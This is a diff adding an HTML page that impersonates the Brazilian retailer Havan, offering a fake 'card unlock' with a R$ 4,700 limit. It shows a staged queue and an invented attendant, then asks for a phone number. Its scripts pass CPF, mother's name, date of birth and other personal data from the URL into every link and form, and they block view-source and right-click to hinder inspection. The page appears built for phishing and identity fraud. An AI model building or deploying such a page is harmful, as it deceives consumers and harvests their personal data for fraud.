@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <script>
+  window.pixelId = "678f8dea8a389097ee008320";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script>
+  window.tikTokPixelId = "6a1b16a46c3e5e35c31de4f7";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+
+    <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+    <link href="../global/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Desbloqueio do Cartão - Havan</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            background: rgb(255, 255, 255);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .main-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        /* Ajustes para mobile */
+        @media (max-width: 768px) {
+            .main-container {
+                margin: 10px;
+                border-radius: 10px;
+            }
+        }
+
+        .video-container {
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            background: #000;
+            border-radius: 8px 8px 0 0;
+        }
+
+        /* Mobile - remove bordas arredondadas do container principal */
+        @media (max-width: 480px) {
+            .main-container {
+                margin: 10px 0 !important;
+                border-radius: 0 !important;
+            }
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+        }
+        .video-wrapper video {
+            display: block;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: #000;
+        }
+        @keyframes arrowBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(8px)} }
+        @keyframes pulseSound { 0%,100%{transform:scale(1)} 50%{transform:scale(1.12)} }
+
+        .video-placeholder {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .limit-section {
+            background: linear-gradient(135deg, #002279, #0066cc);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .content-section {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .queue-loading {
+            display: block;
+            margin-bottom: 30px;
+        }
+
+        .queue-text {
+            font-size: 18px;
+            color: #002279;
+            margin-bottom: 20px;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #002279, #0066cc);
+            width: 0%;
+            border-radius: 4px;
+            animation: loading 30s linear forwards;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .queue-counter {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .attendant-section {
+            display: none;
+            margin-bottom: 30px;
+        }
+
+        .attendant-title {
+            font-size: 18px;
+            color: #002279;
+            margin-bottom: 15px;
+        }
+
+        .attendant-name {
+            font-size: 22px;
+            font-weight: bold;
+            color: #002279;
+            margin-bottom: 20px;
+        }
+
+        .attendant-photo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            overflow: hidden;
+            border: 4px solid #002279;
+        }
+
+        .attendant-photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .phone-section {
+            display: none;
+            margin-bottom: 30px;
+        }
+
+        .phone-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .phone-input:focus {
+            border-color: #002279;
+        }
+
+        .unlock-button {
+            display: none;
+            background-color: #002279;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        .unlock-button:hover {
+            background-color: #001a5c;
+        }
+
+        .unlock-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .styles_company__HQYS3 {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+            gap: 24px;
+            padding: 24px 16px 32px;
+        }
+
+        .styles_company__HQYS3 p {
+            font-size: .75rem;
+            line-height: 16px;
+            letter-spacing: 0;
+        }
+
+        @media (max-width: 768px) {
+            .main-container {
+                margin: 10px;
+                border-radius: 0;
+            }
+            
+            .video-container {
+                height: 250px;
+            }
+            
+            .limit-section {
+                font-size: 20px;
+                padding: 15px;
+            }
+            
+            .content-section {
+                padding: 20px;
+            }
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else {
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+            var code = e.which || e.keyCode;
+            if (e.ctrlKey && (code == 83 || code == 85)) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+                return false;
+            }
+        }
+    </script>
+    <style>
+        body {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        input, textarea {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: text;
+            -khtml-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: all;
+            -khtml-user-select: all;
+            -moz-user-select: all;
+            -ms-user-select: all;
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else {
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    <script>
+        !function(e,t){"object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.install = t() : e.install = t()}(window,(function(){return function(e){var t={ };function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{ }};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o })},n.r=function(e){"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 })},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e, n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject = n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t] = function () { for (var n = [], r = 0; r < arguments.length; r++)n[r] = arguments[r]; var i = o([t], n, !0); e.push(i) }};i.methods.forEach((function(e){a(i, e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n, e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.html";i._i=i._i||{ },i._i[e]=[],i._i[e]._u=a,i._t=i._t||{ },i._t[e]=+new Date,i._o=i._o||{ },i._o[e]=o||{ };var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.html"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('510449167530721283');
+        kwaiq.page();
+    </script>
+
+    <script>
+        !function(e,t){"object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.install = t() : e.install = t()}(window,(function(){return function(e){var t={ };function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{ }};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o })},n.r=function(e){"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 })},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e, n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject = n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t] = function () { for (var n = [], r = 0; r < arguments.length; r++)n[r] = arguments[r]; var i = o([t], n, !0); e.push(i) }};i.methods.forEach((function(e){a(i, e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n, e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.html";i._i=i._i||{ },i._i[e]=[],i._i[e]._u=a,i._t=i._t||{ },i._t[e]=+new Date,i._o=i._o||{ },i._o[e]=o||{ };var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.html"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('261106540113615');
+        kwaiq.page();
+    </script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1062555759088296');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></noscript>
+<!-- End Meta Pixel Code -->
+
+</head>
+
+<body>
+    <div class="header">
+        <img src="images/havan.png" alt="Logo">
+    </div>
+
+    <div class="main-container">
+        <!-- Área do Vídeo -->
+        <div class="video-container" id="videoContainer">
+            <div class="video-wrapper">
+              <video id="nativeVideo" autoplay muted playsinline preload="auto" poster="https://cdn.converteai.net/a0115334-6dcd-43e4-8bd0-be2c842a6cbf/69e8c9b63a084e4af12b18fd/poster.jpg"></video>
+              <div id="unmuteOverlay" style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.55);color:#fff;font-weight:700;font-size:18px;cursor:pointer;text-align:center;padding:16px;gap:12px;">
+                <div style="width:72px;height:72px;border-radius:50%;background:#0042DA;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,.4);animation:pulseSound 1.6s infinite;">
+                  <svg width="36" height="36" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M3 10v4a1 1 0 0 0 1 1h3l4 4V5L7 9H4a1 1 0 0 0-1 1zm13.5 2c0-1.77-1-3.29-2.5-4.03v8.05c1.5-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
+                </div>
+                <div>Toque para ativar o som</div>
+              </div>
+            </div>
+            <div style="height:3px;width:100%;background:rgba(0,0,0,.15);overflow:hidden;">
+                <div id="videoProgress" style="height:100%;width:0;background:#0042DA;transition:width .2s linear;"></div>
+            </div>
+            <script src="https://cdn.jsdelivr.net/npm/hls.js@1"></script>
+            <script>
+              (function(){
+                var v = document.getElementById('nativeVideo');
+                var fill = document.getElementById('videoProgress');
+                var arrow = document.getElementById('videoArrow');
+                var overlay = document.getElementById('unmuteOverlay');
+                var ended = false;
+                var src = 'https://cdn.converteai.net/a0115334-6dcd-43e4-8bd0-be2c842a6cbf/69e8c9b63a084e4af12b18fd/main.m3u8';
+                if (v.canPlayType('application/vnd.apple.mpegurl')) { v.src = src; }
+                else if (window.Hls && Hls.isSupported()) { var hls = new Hls(); hls.loadSource(src); hls.attachMedia(v); }
+                else { v.src = src; }
+                v.loop = false;
+                v.volume = 1;
+                var tryPlay = function(){ if (ended) return; var p = v.play(); if (p && p.catch) p.catch(function(){}); };
+                tryPlay();
+                v.addEventListener('pause', function(){ if (!ended) setTimeout(tryPlay, 0); });
+                v.addEventListener('ended', function(){ ended = true; arrow.style.display = 'block'; });
+                v.addEventListener('timeupdate', function(){ if (v.duration) fill.style.width = (v.currentTime / v.duration * 100) + '%'; });
+                // Tenta iniciar já com som (funciona quando o navegador permite: PWA, MEI alto, etc.)
+                var tryUnmutedAutoplay = function(){
+                  try {
+                    v.muted = false; v.volume = 1;
+                    var p = v.play();
+                    if (p && p.then) {
+                      p.then(function(){ if (overlay) overlay.style.display = 'none'; })
+                       .catch(function(){ v.muted = true; tryPlay(); });
+                    }
+                  } catch(e) { v.muted = true; tryPlay(); }
+                };
+                tryUnmutedAutoplay();
+
+                var unmute = function(){
+                  v.muted = false; v.volume = 1; tryPlay();
+                  if (overlay) overlay.style.display = 'none';
+                  ['pointerdown','touchstart','keydown','click','scroll','mousemove','touchmove'].forEach(function(e){
+                    document.removeEventListener(e, unmute, true);
+                    window.removeEventListener(e, unmute, true);
+                  });
+                };
+                ['pointerdown','touchstart','keydown','click','scroll','mousemove','touchmove'].forEach(function(e){
+                  document.addEventListener(e, unmute, true);
+                  window.addEventListener(e, unmute, true);
+                });
+                if (overlay) overlay.addEventListener('click', unmute);
+              })();
+            </script>
+        </div>
+        <div id="videoArrow" style="display:none;text-align:center;margin-top:14px;animation:arrowBounce 1.2s infinite;">
+            <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 4v14m0 0l-6-6m6 6l6-6" stroke="#0042DA" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </div>
+        
+        
+
+        <!-- Seção do Limite -->
+        <div class="limit-section">
+            Limite de R$ 4.700 reais liberado!
+        </div>
+
+        <!-- Conteúdo Principal -->
+        <div class="content-section">
+            <!-- Loading da Fila -->
+            <div class="queue-loading" id="queueLoading">
+                <div class="queue-text">Você está na fila de espera para ser atendido por um de nossos atendentes</div>
+                <div class="loading-bar">
+                    <div class="loading-progress"></div>
+                </div>
+                <div class="queue-counter" id="queueCounter">Aguarde... Tempo estimado: 30 segundos</div>
+            </div>
+
+            <!-- Seção da Atendente -->
+            <div class="attendant-section" id="attendantSection">
+                <div class="attendant-title">Você será atendido(a) por:</div>
+                <div class="attendant-name">Julia Silva</div>
+                <div class="attendant-photo">
+                    <img src="juliana_silva.jpg" alt="Juliana Silva">
+                </div>
+            </div>
+
+            <!-- Seção do Telefone -->
+            <div class="phone-section" id="phoneSection">
+                <div class="phone-label">Digite seu número de telefone:</div>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="(11) 99999-9999" maxlength="15">
+            </div>
+
+            <!-- Botão de Desbloqueio -->
+            <button class="unlock-button" id="unlockButton" onclick="redirectToChat()">DESBLOQUEAR CARTÃO</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="styles_company__HQYS3">
+        <div>
+            <p class="styles_description__590uc">HAVAN S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100</p>
+            <p class="styles_description__590uc">© 2025 - Todos os direitos reservados</p>
+        </div>
+    </div>
+
+    <script>
+        let timeLeft = 30;
+        
+        // Atualiza o contador de tempo
+        function updateCounter() {
+            const counter = document.getElementById('queueCounter');
+            if (timeLeft > 0) {
+                counter.textContent = `Aguarde... Tempo estimado: ${timeLeft} segundos`;
+                timeLeft--;
+                setTimeout(updateCounter, 1000);
+            } else {
+                counter.textContent = 'Conectando...';
+            }
+        }
+
+        // Inicia o contador
+        updateCounter();
+
+        // Após 30 segundos, mostra a seção da atendente
+        setTimeout(function() {
+            document.getElementById('queueLoading').style.display = 'none';
+            document.getElementById('attendantSection').style.display = 'block';
+            document.getElementById('phoneSection').style.display = 'block';
+            document.getElementById('unlockButton').style.display = 'block';
+        }, 40000);
+
+        // Máscara para o telefone
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 11) {
+                value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+            } else if (value.length >= 7) {
+                value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+            } else if (value.length >= 3) {
+                value = value.replace(/(\d{2})(\d{0,5})/, '($1) $2');
+            } else if (value.length >= 1) {
+                value = value.replace(/(\d{0,2})/, '($1');
+            }
+            e.target.value = value;
+            
+            // Habilita/desabilita o botão baseado no preenchimento
+            const button = document.getElementById('unlockButton');
+            if (value.length >= 14) { // (11) 99999-9999
+                button.disabled = false;
+            } else {
+                button.disabled = true;
+            }
+        });
+
+        function redirectToChat() {
+            const phone = document.getElementById('phoneInput').value;
+            if (phone.length >= 14) {
+                // Mantém os parâmetros UTM na URL
+                const urlParams = new URLSearchParams(window.location.search);
+                urlParams.set('phone', encodeURIComponent(phone));
+                window.location.href = 'chat_final.html?' + urlParams.toString();
+            } else {
+                alert('Por favor, digite um número de telefone válido.');
+            }
+        }
+    </script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || ['cpf','fbclid','gclid','nome','name','mae','nome_mae','sexo','nascimento','data_nascimento','dob','phone','email','cpf_formatado','cor'].includes(key)) {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
